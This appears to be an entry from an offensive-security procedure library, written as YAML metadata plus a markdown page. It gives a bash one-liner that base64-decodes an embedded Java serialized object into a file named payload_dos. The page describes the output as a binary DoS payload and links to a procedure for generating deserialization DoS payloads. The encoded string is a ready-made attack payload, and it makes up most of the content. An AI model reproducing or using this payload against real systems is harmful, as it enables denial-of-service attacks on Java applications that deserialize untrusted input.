---
data: >-
  echo -n
  "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3"
  | base64 -d > payload_dos
tags:
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.157Z'
id: e83ab38b-ce00-4d18-892e-b969f63537da
verified: false
validated: true
submitted: true
---
---

# base64-decode-dos-payload

## Command

```bash
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

## Description

Decodes base64 string to binary DoS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | No newline | Yes |
| String | Encoded payload | Yes |
| -d | Decode | Yes |
| > file | Output | Yes |

## Examples

### Basic Usage

```bash
echo -n "..." | base64 -d > payload_dos
```

## Expected Output

Binary file created.

## Related

- [[Related Procedure: Generate-DoS-Deserialization-Payload]]
